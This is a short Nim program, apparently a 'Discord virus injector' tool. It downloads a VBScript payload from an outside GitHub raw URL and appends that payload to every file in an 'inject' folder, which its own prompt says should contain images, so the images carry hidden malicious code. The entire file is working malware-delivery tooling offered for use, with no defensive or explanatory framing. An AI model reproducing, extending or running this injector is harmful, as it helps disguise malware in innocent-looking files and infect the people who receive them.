import
    std/[os, strutils, httpclient, strformat]

proc getTriggerCode: string =
    var client = newHttpClient()
    return client.request("https://raw.githubusercontent.com/TaxMachine/discord-virus-injector/main/payload.vbs", HttpGet).body

proc writeCodeToFile(file: string, code: string): void =
    var file = open(file, fmAppend)
    file.write("\n" & code)
    file.close()

when isMainModule:
    discard execShellCmd("cls")
    if not dirExists("inject"):
        echo "\x1b[1minject folder not found, creating one..."
        createDir("inject")
        echo "put the images in the folder and run the injector again"
        quit(0)
    var code = getTriggerCode()
    for files in walkDir("inject"):
        if files.kind == pcFile:
            echo fmt"Injecting vbs code into {files.path} 👾"
            writeCodeToFile(files.path, code)
    echo "Recursive injection done ✔"